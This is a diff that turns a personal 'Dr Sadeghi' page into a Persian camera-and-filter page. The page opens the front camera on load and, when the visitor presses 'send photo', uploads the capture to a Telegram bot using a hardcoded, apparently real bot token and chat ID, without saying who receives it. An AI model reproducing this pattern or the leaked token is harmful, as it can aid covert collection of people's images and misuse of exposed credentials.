@@ -1,18 +1,115 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dr Sadeghi</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>عکس از دوربین و ویرایش</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 400px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        video, canvas {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #25d366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #1ebe50;
+        }
+        .controls {
+            display: flex;
+            justify-content: space-between;
+        }
+    </style>
 </head>
 <body>
-    <audio autoplay>
-        <source src="music.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
     <div class="container">
-        <h1 class="blinking-text">Dr Sadeghi</h1>
+        <h2>عکس از دوربین و ویرایش</h2>
+        <video id="video" autoplay></video>
+        <canvas id="canvas"></canvas>
+        <div class="controls">
+            <button onclick="capturePhoto()">گرفتن عکس</button>
+            <button onclick="applyFilter()">اعمال فیلتر</button>
+            <button onclick="sendPhoto()">ارسال عکس</button>
+        </div>
     </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const constraints = { video: { facingMode: 'user' } };
+
+        navigator.mediaDevices.getUserMedia(constraints)
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                alert('خطا در دسترسی به دوربین.');
+                console.error(error);
+            });
+
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        }
+
+        function applyFilter() {
+            context.filter = 'grayscale(100%)'; // اعمال فیلتر سیاه و سفید
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        }
+
+        function sendPhoto() {
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob);
+
+                const token = '7136537174:AAFYT6q7kfwALYQG9RkDzYpfSsUq7EuQ7GY'; // جایگزین با توکن ربات شما
+                const chatId = '7389856256'; // جایگزین با آی‌دی چت شما
+                const url = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`;
+
+                fetch(url, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert('عکس با موفقیت ارسال شد!');
+                    } else {
+                        alert('خطا در ارسال عکس.');
+                    }
+                })
+                .catch(error => {
+                    alert('خطا در ارسال عکس.');
+                });
+            }, 'image/jpeg');
+        }
+    </script>
 </body>
 </html>
